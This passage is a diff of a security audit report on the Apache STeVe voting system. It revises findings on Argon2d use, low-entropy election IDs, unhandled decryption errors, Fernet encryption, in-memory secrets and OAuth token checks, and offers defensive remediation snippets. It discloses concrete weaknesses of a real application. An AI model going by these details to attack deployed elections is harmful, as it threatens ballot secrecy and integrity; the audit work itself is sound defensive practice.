 While the code acknowledges a planned transition from Fernet to XChaCha20-Poly1305, there is no documented migration plan addressing post-quantum cryptography threats. The current cryptographic primitives (AES-128, SHA-256, BLAKE2b) have varying levels of quantum resistance, and no formal assessment or migration roadmap exists. Without a migration plan, the project cannot react efficiently to quantum computing advances. The planned Fernet → XChaCha20-Poly1305 migration doesn't address quantum threats (both are symmetric and similarly affected by Grover's algorithm). AES-128 specifically should be upgraded to AES-256 for quantum resistance.
 
 **Remediation:**
 
-Create a `PQC_MIGRATION_PLAN.md` documenting: 1. Current algorithm inventory with quantum risk assessment 2. Timeline for migrating AES-128 (Fernet) to AES-256 or authenticated encryption with 256-bit keys 3. Assessment of when PQC-resistant key exchange might be needed (if TLS/network crypto is added) 4. Crypto-agility requirements (see 11.2.2) to enable seamless future upgrades 5. Data re-encryption strategy for stored ciphertext
+Create a PQC_MIGRATION_PLAN.md documenting: 1. Current algorithm inventory with quantum risk assessment 2. Timeline for migrating AES-128 (Fernet) to AES-256 or authenticated encryption with 256-bit keys 3. Assessment of when PQC-resistant key exchange might be needed (if TLS/network crypto is added) 4. Crypto-agility requirements (see 11.2.2) to enable seamless future upgrades 5. Data re-encryption strategy for stored ciphertext
 
 ---
 
-#### FINDING-084: Argon2d (Type.D) Used Instead of Recommended Argon2id (Type.ID)
+#### FINDING-079: Argon2d (Type.D) Used Instead of Recommended Argon2id (Type.ID)
 
 | Attribute | Value |
 |-----------|-------|
@@ -1716,39 +1882,43 @@ Create a `PQC_MIGRATION_PLAN.md` documenting: 1. Current algorithm inventory wit
 | **ASVS Level(s)** | L2, L3, L1 |
 | **CWE** | N/A |
 | **ASVS Sections** | 11.2.1, 11.2.4, 11.4.2, 11.4.4, 11.6.1, 15.2.1 |
-| **Files** | v3/steve/crypto.py:89, v3/steve/crypto.py:87 |
+| **Files** | v3/steve/crypto.py:89, v3/steve/crypto.py:87, v3/steve/crypto.py:84, v3/steve/crypto.py:85-93 |
 | **Source Reports** | 11.2.1.md, 11.2.4.md, 11.4.2.md, 11.4.4.md, 11.6.1.md, 15.2.1.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The production code uses argon2.low_level.Type.D (Argon2d), while the OWASP Password Storage Cheat Sheet and NIST SP 800-63B recommend Argon2id as the preferred variant. Argon2d is vulnerable to side-channel attacks (timing attacks based on memory access patterns). The benchmark function at line 116 correctly uses Type.ID (Argon2id), indicating the developer is aware of the preferred variant but used the wrong one in production. An attacker with physical/VM co-location access could observe memory access patterns during vote token generation to recover secret data, since Argon2d's memory accesses are data-dependent. This affects key derivation used for both password storage (11.4.2) and key stretching (11.4.4), and represents a suboptimal algorithm choice (11.6.1).
+**Description:**
+
+The production _hash() function uses Argon2d (data-dependent memory access), which is vulnerable to side-channel attacks (cache-timing attacks). RFC 9106 and OWASP recommend Argon2id for most applications, as it combines the side-channel resistance of Argon2i with the GPU/ASIC resistance of Argon2d. The benchmark function at line 118 correctly uses Type.ID, suggesting awareness of the recommended variant, but the production code was not updated. In environments where an attacker can observe memory access patterns (shared hosting, VMs, certain cloud environments), Argon2d is vulnerable to side-channel extraction of the secret. This could enable extraction of opened_keys or vote_tokens.
 
 **Remediation:**
 
-Change the type parameter in the _hash() function from argon2.low_level.Type.D to argon2.low_level.Type.ID as recommended by RFC 9106. Note: this will change all derived values, so must be coordinated with any existing deployed databases. Add a crypto_version column to the vote table to enable future algorithm transitions without data loss.
+Change the type parameter in the _hash() function from argon2.low_level.Type.D to argon2.low_level.Type.ID (RFC 9106 recommended). Note: this will change all derived values, so must be coordinated with any existing deployed databases. Add a crypto_version column to the vote table to enable future algorithm transitions without data loss.
 
 ---
 
-#### FINDING-085: ID generation uses insufficient entropy (40 bits vs required 128 bits)
+#### FINDING-080: ID Generation Uses Insufficient Entropy (40 bits)
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 11.2.3, 11.5.1, 7.2.3 |
-| **Files** | v3/steve/crypto.py:100 |
-| **Source Reports** | 11.2.3.md, 11.5.1.md, 7.2.3.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Level(s)** | L2 |
+| **CWE** | CWE-330 |
+| **ASVS Sections** | 11.2.3, 11.5.1 |
+| **Files** | v3/steve/crypto.py:100, v3/steve/crypto.py:101, v3/steve/election.py:171, v3/steve/election.py:379 |
+| **Source Reports** | 11.2.3.md, 11.5.1.md |
+| **Related Findings** | None |
 
-The `create_id()` function generates only 5 bytes (40 bits) of entropy for election/issue IDs. However, these are not session tokens — they are resource identifiers. The schema documentation explicitly states: 'We do not use AUTOINCREMENT, so that URLs for Elections cannot be deduced.' The 40-bit space (~1 trillion possible values) provides unpredictability for URL-based resource identifiers, though it wouldn't meet session token requirements. The actual session tokens are managed by `asfquart.session`, which is an external dependency not included in the provided source. We cannot verify whether session reference tokens meet the 128-bit entropy requirement. The `crypto.py` module demonstrates use of `secrets.token_bytes(16)` (128 bits) for salts, indicating awareness of appropriate entropy levels for cryptographic operations.
+**Description:**
+
+The create_id() function generates identifiers using only 5 bytes (40 bits of entropy), significantly below the 128-bit threshold recommended for cryptographic security parameters. While create_id() is not a traditional cryptographic primitive, it provides the security property of preventing URL/identifier guessing for election IDs and issue IDs. With only 40 bits of entropy (~10^12 possibilities), an attacker with sustained access could enumerate valid election IDs or issue IDs. With ~1 trillion possible values and only a small subset being valid, this is mitigated by the online attack constraint (rate limiting, network latency). However, for a voting system where ballot secrecy is paramount, the margin is thin.
 
 **Remediation:**
 
-1. Verify that `asfquart.session` generates session tokens with at least 128 bits of entropy using a CSPRNG. 2. Document the session token generation mechanism: python\n# Session Token Specification:\n# - Generated by asfquart.session using [specific mechanism]\n# - Token length: [N] bytes ([M] bits of entropy)\n# - Source: [e.g., os.urandom / secrets module]\n# - Verified to meet ASVS 7.2.3 (128+ bits, CSPRNG)\n
+Use secrets.token_hex(16) to generate 16 bytes (128 bits) encoded as 32 hex characters. This requires schema changes to accommodate 32-character IDs and updating CHECK constraints in schema.sql. Example code: def create_id(): return secrets.token_hex(16)  # 16 bytes = 128 bits
 
 ---
 
-#### FINDING-086: Unhandled cryptographic decryption exceptions in vote tallying
+#### FINDING-081: Unhandled Cryptographic Decryption Exceptions in Vote Tallying
 
 | Attribute | Value |
 |-----------|-------|
@@ -1758,17 +1928,19 @@ The `create_id()` function generates only 5 bytes (40 bits) of entropy for elect
 | **ASVS Sections** | 11.2.5 |
 | **Files** | v3/steve/election.py:283-290, v3/steve/crypto.py |
 | **Source Reports** | 11.2.5.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The tally_issue() function in election.py does not handle exceptions from crypto.decrypt_votestring(). If any single vote's ciphertext is corrupted (database corruption, malicious tampering with the SQLite file), the entire tally_issue() operation will fail with an unhandled cryptography.fernet.InvalidToken exception. This is a denial-of-service vector against the tallying function. While Fernet's encrypt-then-MAC construction prevents Padding Oracle attacks specifically (HMAC is verified before decryption), the lack of error handling means: (1) A single corrupted vote prevents ALL votes from being tallied, (2) The exception type/message could potentially differentiate between HMAC failure and other issues in some library versions.
+**Description:**
+
+If any single vote's ciphertext is corrupted (database corruption, malicious tampering with the SQLite file), the entire tally_issue() operation will fail with an unhandled cryptography.fernet.InvalidToken exception. This is a denial-of-service vector against the tallying function. While Fernet's encrypt-then-MAC construction prevents Padding Oracle attacks specifically (HMAC is verified before decryption), the lack of error handling means: 1) A single corrupted vote prevents ALL votes from being tallied, 2) The exception type/message could potentially differentiate between HMAC failure and other issues in some library versions. Data flow: ciphertext from database → Fernet.decrypt() → no exception handling → unhandled InvalidToken propagates → entire tally operation fails.
 
 **Remediation:**
 
-Wrap the decrypt_votestring() call in a try/except block to catch exceptions generically. Log failures without exposing details that could differentiate between HMAC failure vs decryption failure. Skip the corrupted vote and continue processing remaining votes. Example: try: votestring = crypto.decrypt_votestring(vote_token, mayvote.salt, row.ciphertext); votes.append(votestring) except Exception: _LOGGER.error(f'Failed to decrypt vote for issue {iid} - vote skipped'); continue
+Wrap the decryption call in a try/except block to handle InvalidToken exceptions gracefully. Log the failure generically without exposing details that could differentiate between HMAC failure vs decryption failure. Skip the corrupted vote and continue processing remaining votes rather than failing the entire tally operation.
 
 ---
 
-#### FINDING-087: Use of Fernet (AES-128-CBC) instead of approved AEAD cipher
+#### FINDING-082: Use of Fernet (AES-128-CBC) Instead of Approved AEAD Cipher
 
 | Attribute | Value |
 |-----------|-------|
@@ -1778,77 +1950,19 @@ Wrap the decrypt_votestring() call in a try/except block to catch exceptions gen
 | **ASVS Sections** | 11.3.2 |
 | **Files** | v3/steve/crypto.py:72-82 |
 | **Source Reports** | 11.3.2.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The code explicitly acknowledges it should be using XChaCha20-Poly1305 (an AEAD cipher) but is currently using Fernet (AES-128-CBC + HMAC-SHA256). While Fernet is a secure authenticated encryption construction, it is not a native AEAD mode. Modern ASVS standards prefer purpose-built AEAD ciphers (AES-GCM, ChaCha20-Poly1305, XChaCha20-Poly1305) which provide authenticated encryption in a single primitive with formal security proofs. Key concerns: AES-CBC is a legacy mode that requires careful composition with MAC; Fernet's AES-128 provides only 128 bits of security vs the 256-bit key being derived (waste of key material); The HKDF info parameter says 'xchacha20_key' but the key is used for Fernet indicating incomplete migration; The 32-byte HKDF output is base64-encoded and fed to Fernet, which internally splits it into 16 bytes signing + 16 bytes encryption (AES-128), not using the full 256 bits.
+**Description:**
 
-**Remediation:**
-
-Replace Fernet with ChaCha20-Poly1305 AEAD cipher. Derive a 32-byte key using HKDF with appropriate info parameter ('chacha20_poly1305_key'). Generate a 96-bit nonce using os.urandom(12) for each encryption. Use ChaCha20Poly1305 class from cryptography.hazmat.primitives.ciphers.aead. Prepend the nonce to ciphertext for storage/transmission. Update decrypt_votestring to extract nonce from first 12 bytes and decrypt remainder.
-
----
-
-#### FINDING-088: TLS Private Key Path Stored in Configuration File
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.3.1 |
-| **Files** | v3/server/config.yaml.example:30-31 |
-| **Source Reports** | 13.3.1.md |
-| **Related Findings** | None | **Description:**
-
-While this is an example file, the configuration pattern stores TLS private key filesystem paths in a YAML file that may be committed to source control or included in build artifacts. The actual private key material resides on the filesystem accessible to the application process without vault-based access control. Configuration shows: certfile: localhost.apache.org+3.pem and keyfile: localhost.apache.org+3-key.pem
+The code explicitly acknowledges it should be using XChaCha20-Poly1305 (an AEAD cipher) but is currently using Fernet (AES-128-CBC + HMAC-SHA256). While Fernet is a secure authenticated encryption construction, it is not a native AEAD mode. Modern ASVS standards prefer purpose-built AEAD ciphers (AES-GCM, ChaCha20-Poly1305, XChaCha20-Poly1305) which provide authenticated encryption in a single primitive with formal security proofs. Key concerns: AES-CBC is a legacy mode that requires careful composition with MAC; Fernet's AES-128 provides only 128 bits of security vs the 256-bit key being derived (waste of key material); The HKDF info parameter says b'xchacha20_key' but the key is used for Fernet indicating incomplete migration; The 32-byte HKDF output is base64-encoded and fed to Fernet, which internally splits it into 16 bytes signing + 16 bytes encryption (AES-128), not using the full 256 bits.
 
 **Remediation:**
 
-Reference TLS material via a secrets manager or environment variable pointing to a managed certificate store. Example: certfile: ${VAULT_TLS_CERT_PATH} and keyfile: ${VAULT_TLS_KEY_PATH}. Store TLS private keys in a vault solution with access control rather than on the filesystem.
+Replace Fernet with ChaCha20-Poly1305 AEAD cipher. Use cryptography.hazmat.primitives.ciphers.aead.ChaCha20Poly1305 with 32-byte keys derived from HKDF. Generate 96-bit nonces using os.urandom(12) and prepend to ciphertext for decryption. Update HKDF info parameter to b'chacha20_poly1305_key' to match actual usage. This provides authenticated encryption with a single primitive and utilizes the full 256 bits of key material.
 
 ---
 
-#### FINDING-089: Argon2 Key Derivation Exposes Intermediate Key Material
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.3.3 |
-| **Files** | v3/steve/crypto.py:39-55 |
-| **Source Reports** | 13.3.3.md |
-| **Related Findings** | None | **Description:**
-
-The opened_key (election master secret) is passed as a parameter to gen_vote_token() and concatenated with voter identifiers in application memory. In an isolated security module architecture, the master key would never leave the secure boundary — only derived tokens would be exported. The gen_opened_key function creates a 64-byte digest in memory and returns a 32-byte key to the caller, exposing intermediate key material throughout the process.
-
-**Remediation:**
-
-Restructure so that the opened_key is a reference to a key stored within the security module, and derivation happens inside the module boundary. The master key should never be passed as a parameter or concatenated in application memory. Implement key derivation operations within the isolated security module (vault/HSM) so that only derived tokens are exported to the application.
-
----
-
-#### FINDING-090: Closed Elections Retain Cryptographic Material Indefinitely
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 13.3.4 |
-| **Files** | v3/steve/election.py:116-121, v3/schema.sql |
-| **Source Reports** | 13.3.4.md |
-| **Related Findings** | None | **Description:**
-
-After an election is closed and results tallied, the cryptographic key material (salt, opened_key, per-voter salt values) remains in the database indefinitely. There is no procedure to destroy secrets after they are no longer needed (post-tally verification period). This violates the principle that secrets should have defined lifetimes.
-
-**Remediation:**
-
-Implement an archive_election() method that after a retention period (e.g., 90 days) has passed, verifies the retention period has elapsed, then zeros out cryptographic material by setting salt and opened_key to NULL for election records, setting salt to NULL for all mayvote records, and deleting encrypted votes.
-
----
-
-#### FINDING-091: Lack of Full Memory Encryption for Sensitive Data In-Use
+#### FINDING-083: Sensitive Data Unprotected in Process Memory Without Memory Encryption
 
 | Attribute | Value |
 |-----------|-------|
@@ -1858,157 +1972,63 @@ Implement an archive_election() method that after a retention period (e.g., 90 d
 | **ASVS Sections** | 11.7.1 |
 | **Files** | v3/steve/crypto.py, v3/steve/election.py |
 | **Source Reports** | 11.7.1.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
+
+**Description:**
 
 Sensitive data including opened_key, vote_token, decrypted vote strings, and PIDs exist unprotected in process memory. The data flow shows: Encrypted ciphertext → decrypted votestrings → accumulated in votes list → passed to tally → returned from function, all without memory encryption. An attacker with memory access (via memory dump, cold boot attack, swap file analysis, or process inspection) could recover individual votes, compromising ballot secrecy.
 
 **Remediation:**
 
-Implement hardware-backed memory encryption using technologies such as: Intel TME (Total Memory Encryption) / MKTME, AMD SEV (Secure Encrypted Virtualization), or ARM CCA (Confidential Compute Architecture). At the application level, consider using memory-safe containers or encrypted memory regions via libraries like sodium with sodium_mlock() / sodium_munlock(). Long-term recommendations include: using mlock() for memory pages containing decrypted votes during tally operations, implementing explicit memory clearing patterns, and implementing incremental hashing in gather_election_data() to use streaming hash computation instead of accumulating all voter data in memory.
+Implement hardware-backed memory encryption using technologies such as: Intel TME (Total Memory Encryption) / MKTME, AMD SEV (Secure Encrypted Virtualization), or ARM CCA (Confidential Compute Architecture). At the application level, consider using memory-safe containers or encrypted memory regions via libraries like sodium with sodium_mlock() / sodium_munlock(). Additionally, consider using mlock() for memory pages containing decrypted votes during tally operations, and implement explicit memory clearing patterns.
 
 ---
 
-#### FINDING-092: Incomplete Formal Data Classification into Protection Levels
+#### FINDING-084: OAuth/OIDC token handling mechanism not verifiable - session security cannot be confirmed
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 14.1.1, 14.1.2 |
-| **Files** | v3/docs/schema.md |
-| **Source Reports** | 14.1.1.md, 14.1.2.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 10.1.1 |
+| **Files** | v3/server/pages.py:58-84 |
+| **Source Reports** | 10.1.1.md |
+| **Related Findings** | None |
 
-The documentation describes cryptographic mechanisms used but does not define a comprehensive set of protection requirements for each data sensitivity level. Missing documentation includes: formal encryption standards (Fernet mentioned, XChaCha20 planned but no formal requirement), integrity verification requirements (Argon2 opened_key described but no formal requirement), data retention policy (older votes retained for auditing but no retention period/purge schedule defined), logging requirements (no documented policy on what can/cannot be logged), formal access controls documentation (owner_pid and authz mentioned but no formal RBAC documentation), database-level encryption (no mention of SQLite encryption at rest), privacy requirements (vote anonymity implied but not formally specified), and key management (no documentation on key rotation, backup, or destruction). Without documented protection requirements: data retention may grow indefinitely, key management procedures are undefined, logging of sensitive data has no enforceable policy, and database file encryption status is undocumented.
+**Description:**
+
+The application uses session-based authentication via `asfquart.session.read()`. Session data containing `uid`, `fullname`, and `email` is passed to EZT templates for rendering. However, the OAuth/OIDC token handling itself is abstracted within the `asfquart` library, which is not provided for review. The application does NOT appear to expose access tokens or refresh tokens to the browser. The session is read server-side and only user-facing attributes (uid, name, email) are passed to templates. The templates do not reference any OAuth tokens. The backend appears to act as a BFF pattern where token handling is server-side only. The `asfquart` session mechanism is not inspectable in this code. If the session cookie itself contains embedded tokens (e.g., JWT session), or if the session store leaks token values, this cannot be verified from the provided code.
 
 **Remediation:**
 
-Add a 'Data Protection Requirements' section to schema.md that includes: Encryption requirements (all vote ciphertext MUST use authenticated encryption, database file MUST be readable only by application user with chmod 600, cryptographic salts MUST be generated using secrets.token_bytes()); Integrity requirements (election tampering MUST be detectable via opened_key verification using Argon2, foreign key constraints MUST be enforced at runtime); Retention requirements (closed election data MUST be retained for [X] months for audit purposes, vote re-voting history MUST be purged after tallying is complete, person records MUST be reviewed annually for GDPR/privacy compliance); Logging requirements (encrypted vote content/ciphertext MUST NEVER appear in logs, salt values MUST NEVER appear in logs, opened_key MUST NEVER appear in logs, election IDs and issue IDs MAY be logged for operational purposes); Access Control requirements (only election owner and authz group may modify elections, administrative decryption requires CLI access with encryption keys, database file access restricted to application service account).
+Verify that the `asfquart` session mechanism does not expose raw OAuth tokens in cookies or responses. Ensure session cookies are `HttpOnly`, `Secure`, and `SameSite`. Audit the `asfquart` library's OAuth implementation to verify token storage security (HttpOnly, Secure cookies) and session fixation protection. Add SameSite cookie attributes to ensure session cookies use `SameSite=Lax` or `SameSite=Strict` as an additional defense layer.
 
 ---
 
-#### FINDING-093: Integrity verification (opened_key) does not cover authorization-critical fields
+#### FINDING-085: No visible audience claim validation for access tokens
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 14.2.4 |
-| **Files** | v3/steve/election.py:90-110 |
-| **Source Reports** | 14.2.4.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 10.3.1 |
+| **Files** | v3/server/pages.py (all endpoints using @asfquart.auth.require) |
+| **Source Reports** | 10.3.1.md |
+| **Related Findings** | None |
 
-The gather_election_data() function only includes eid and title in the integrity hash, omitting owner_pid and authz fields. If owner_pid or authz fields are modified after an election is opened (e.g., via direct database manipulation or a future admin endpoint), the tamper detection via is_tampered() will NOT detect the change. An attacker with database write access could reassign election ownership without triggering integrity alerts.
+**Description:**
 
-**Remediation:**
-
-Include all integrity-critical fields in gather_election_data(): mdata = md.eid + md.title + md.owner_pid + (md.authz or '')
-
----
-
-#### FINDING-094: Tamper detection not automatically invoked during critical operations
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 14.2.4 |
-| **Files** | v3/steve/election.py:260-273 |
-| **Source Reports** | 14.2.4.md |
-| **Related Findings** | None | **Description:**
-
-The is_tampered() method exists but is not automatically called in critical operations like add_vote() or tally_issue(). If the election data is tampered with after opening, votes can still be cast and tallied against a corrupted election without the integrity check being triggered. The method must be called externally by the web layer—there is no enforcement that it has been called before add_vote() proceeds.
+The application acts as a resource server (protected API/web application). Token/session validation is performed by `asfquart.auth.require`, but there is no visible audience (`aud`) claim validation in the provided code. If the authentication mechanism uses structured access tokens (JWTs), the application should verify that tokens are intended for this specific service. If another service in the ASF infrastructure issues tokens with the same authorization server but different intended audiences, a token meant for another service could potentially be used to access this application. The `asfquart.auth.require` decorator handles all authentication, but whether it validates the `aud` claim depends on the library's implementation, which is not provided.
 
 **Remediation:**
 
-Add integrity verification before accepting votes: if pdb and self.is_tampered(pdb): raise ElectionTampered(self.eid). Either call is_tampered() within add_vote() automatically, or add a decorator that ensures the web layer has performed the check before the method executes.
+Verify that the `asfquart` library validates the `aud` claim during token exchange or session creation. If using JWT access tokens directly, add audience validation. Example conceptual configuration: APP.config['OAUTH_AUDIENCE'] = 'steve-voting-system' and ensure asfquart validates this during token/session processing.
 
 ---
 
-#### FINDING-095: Superseded votes retained indefinitely without purge mechanism
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 14.2.7 |
-| **Files** | v3/docs/schema.md, v3/schema.sql |
-| **Source Reports** | 14.2.7.md |
-| **Related Findings** | None | **Description:**
-
-When a voter re-votes, all previous encrypted votes remain in the database. While only the latest vote (MAX(vid)) is used for tallying, the old ciphertexts represent: (1) Historical sensitive data with no defined retention period, (2) Potential attack surface if encryption keys are later compromised, (3) Storage of data that serves no ongoing operational purpose after tallying. There is no query in `queries.yaml` to delete superseded votes, no scheduled cleanup, and no retention policy documentation.
-
-**Remediation:**
-
-Add queries to queries.yaml for purging old votes: `c_purge_old_votes` to delete superseded votes for a given vote_token (keeping only MAX(vid)), and `c_purge_election_votes` to delete all votes for a specific closed election. Implement a cleanup mechanism that runs after tallying or on a scheduled basis to remove superseded votes that are no longer needed for operational purposes.
-
----
-
-#### FINDING-096: Person records have no lifecycle management or cleanup
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | N/A |
-| **ASVS Sections** | 14.2.7 |
-| **Files** | v3/queries.yaml, v3/schema.sql |
-| **Source Reports** | 14.2.7.md |
-| **Related Findings** | None | **Description:**
-
-Person records (containing PID, name, and email) accumulate indefinitely. While `c_delete_person` exists, `ON DELETE RESTRICT` constraints on `mayvote` and `election.owner_pid` prevent deletion as long as any election references the person. Since opened elections cannot be deleted, person records for anyone who has ever participated in an election become effectively permanent. This results in indefinite retention of PII without a defined retention schedule or cleanup mechanism.
-
-**Remediation:**
-
-Implement a data anonymization mechanism for persons in completed elections: `def anonymize_person_in_closed_elections(self, pid)` that replaces PII (name and email) with anonymized values after the retention period expires, while preserving referential integrity. This allows person records to remain for database consistency while removing sensitive personal information.
-
----
-
-#### FINDING-097: Missing PKCE (Proof Key for Code Exchange) in OAuth Flow
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L1 |
-| **CWE** | N/A |
-| **ASVS Sections** | 10.1.2, 10.2.1, 10.4.6, 10.4.4 |
-| **Files** | v3/server/main.py:39-42 |
-| **Source Reports** | 10.1.2.md, 10.2.1.md, 10.4.6.md, 10.4.4.md |
-| **Related Findings** | None | **Description:**
-
-The OAuth authorization URL template includes a `state` parameter (`state=%s`), which indicates the `asfquart` framework generates and substitutes state values. However, there is no PKCE (Proof Key for Code Exchange) visible in the authorization request URL. The URL template lacks `code_challenge` and `code_challenge_method` parameters, and no `code_verifier` generation or binding logic is present in the provided code. While the `state` parameter provides some CSRF protection, PKCE provides additional protection against authorization code interception attacks (especially relevant for deployments where the callback URI could be intercepted). The absence of PKCE means the flow relies solely on `state` and the confidentiality of the `code`. This affects multiple ASVS requirements related to PKCE enforcement and code interception protection.
-
-**Remediation:**
-
-Modify OAuth URL template to include PKCE parameters: `asfquart.generics.OAUTH_URL_INIT = ('https://oauth.apache.org/auth?state=%s&redirect_uri=%s&code_challenge=%s&code_challenge_method=S256')`. Framework must generate code_verifier (43-128 chars, cryptographically random), compute code_challenge = BASE64URL(SHA256(code_verifier)), store code_verifier in session, and send it with the token exchange request. Example: code_verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).rstrip(b'=').decode(); code_challenge = base64.urlsafe_b64encode(hashlib.sha256(code_verifier.encode()).digest()).rstrip(b'=').decode().
-
----
-
-#### FINDING-098: Missing Fine-Grained Authorization Based on Election Ownership and LDAP Group Claims
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | N/A |
-| **ASVS Sections** | 10.3.2 |
-| **Files** | v3/server/pages.py:488, v3/server/pages.py:509, v3/server/pages.py:527, v3/server/pages.py:553, v3/server/pages.py:577, v3/server/pages.py:421, v3/server/pages.py:99, v3/server/pages.py:195, v3/server/pages.py:224 |
-| **Source Reports** | 10.3.2.md |
-| **Related Findings** | None | **Description:**
-
-While the application verifies that users have a 'committer' role from their OAuth session using @asfquart.auth.require({R.committer}), it does not enforce finer-grained authorization based on election ownership (owner_pid) or LDAP group membership (authz field). The application has systematic '### check authz' comments at 9+ locations indicating the authorization control was conceptualized but never implemented (Type B gap). This means ANY authenticated committer can open/close any election, add/edit/delete issues in any election, and set dates on any election, regardless of whether they own the election or are members of the authorized LDAP group. The domain model includes owner_pid and authz fields, but these are never checked before allowing management operations.
-
-**Remediation:**
-
-Implement election ownership authorization checks in the load_election and load_election_issue decorators before any management operation executes. The remediation should: 1) Retrieve the election metadata including owner_pid and authz fields, 2) Compare the authenticated user's uid (from session claims) with the owner_pid, 3) If not the owner, check if the user is a member of the LDAP group specified in the authz field using PersonDB.is_member_of_group(), 4) Return 403 Forbidden if neither condition is met. Example implementation: Check if result.uid != metadata.owner_pid, then if metadata.authz exists, verify pdb.is_member_of_group(result.uid, metadata.authz), otherwise abort with 403. Apply this check in the load_election decorator so all endpoints using it inherit the protection.
-
----
-
-#### FINDING-099: User identification does not verify iss+sub combination from token claims
+#### FINDING-086: User identification relies on `uid` alone without verifiable `iss` + `sub` combination
 
 | Attribute | Value |
 |-----------|-------|
@@ -2016,39 +2036,43 @@ Implement election ownership authorization checks in the load_election and load_
 | **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
 | **ASVS Sections** | 10.3.3 |
-| **Files** | v3/server/pages.py:82-89 |
+| **Files** | v3/server/pages.py:82-87, v3/server/main.py:39-42 |
 | **Source Reports** | 10.3.3.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The application identifies users solely by `uid` extracted from the session, which is populated by the `asfquart` framework's OAuth callback. There is no visible validation that the user identity is derived from a combination of `iss` (issuer) and `sub` (subject) claims that cannot be reassigned. The code relies entirely on the `asfquart` framework to properly map OAuth token claims to `uid`, with no explicit verification of the issuer claim. While the application uses a single OAuth provider (`oauth.apache.org`), the `uid` is consumed without any verification that: 1. The token was issued by the expected issuer (`iss` claim validation) 2. The `sub` claim maps uniquely to this user across all possible issuers. If the `asfquart` framework has a misconfiguration or if a second OAuth provider is ever added, user identity could be confused. An attacker at a different IdP could potentially obtain a token with the same `uid`/`sub` that maps to a different user.
+**Description:**
+
+The session stores only `uid` without preserving the token issuer (`iss`). While the system currently uses a single identity provider (oauth.apache.org), the user identification does not include an issuer component. If the system were ever configured to accept tokens from multiple issuers, or if session data could be manipulated, a `uid` from one issuer could be confused with the same `uid` from another. The `asfquart` framework likely handles token validation internally, but the application-level code only works with a flat `uid` string. There is no verification that the combination of issuer and subject is used as the unique identifier in the database (`steve.persondb` uses `uid` as the primary key). In the current single-issuer deployment, the risk is low. However, the architecture doesn't enforce the `iss` + `sub` combination pattern, making it fragile against future changes or issuer confusion if multiple OAuth providers are ever supported.
 
 **Remediation:**
 
-Verify the session was established from the expected issuer and use iss+sub combination as the canonical user identifier. Example: async def basic_info(): s = await asfquart.session.read(); if s: expected_issuer = 'https://oauth.apache.org'; if s.get('iss') != expected_issuer: _LOGGER.warning(f'Unexpected issuer in session: {s.get("iss")}'); return basic; canonical_id = f"{s['iss']}:{s['sub']}"; basic.update(uid=s['uid'], canonical_user_id=canonical_id, name=s['fullname'], email=s['email'])
+In session establishment (within asfquart callback), store session data with both `uid` and `iss`: session_data = {'uid': token_claims['sub'], 'iss': token_claims['iss'], 'fullname': token_claims.get('name', ''), 'email': token_claims.get('email', '')}. In authorization checks, construct a unique user identifier from iss + sub: def get_unique_user_id(session): return f"{session['iss']}#{session['uid']}"
 
 ---
 
-#### FINDING-100: No verification of authentication strength, methods, or recentness for sensitive operations
+#### FINDING-087: No verification of authentication strength, methods, or recentness for sensitive operations
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2, L3 |
+| **ASVS Level(s)** | L2 |
 | **CWE** | N/A |
-| **ASVS Sections** | 10.3.4, 6.8.4, 8.4.2 |
-| **Files** | v3/server/pages.py:484 |
-| **Source Reports** | 10.3.4.md, 6.8.4.md, 8.4.2.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 10.3.4 |
+| **Files** | v3/server/pages.py (all sensitive endpoints) |
+| **Source Reports** | 10.3.4.md |
+| **Related Findings** | None |
 
-The application uses different authorization levels for different functions (R.committer for most operations, R.pmc_member for creating elections) representing different privilege levels, yet the application never verifies the authentication strength or method used by the IdP. No OIDC claims like acr (Authentication Context Class Reference), amr (Authentication Methods References), or auth_time are inspected anywhere in the visible code. The application has sensitive operations (opening/closing elections, casting votes) that could benefit from step-up authentication verification, but no mechanism exists to differentiate between a user who authenticated with a password vs. MFA. If the ASF OAuth provider supports multiple authentication methods (password-only, MFA, hardware keys), the application cannot distinguish between them. A user authenticated with a weak method (e.g., compromised password without MFA) would have the same access as one authenticated with strong authentication.
+**Description:**
+
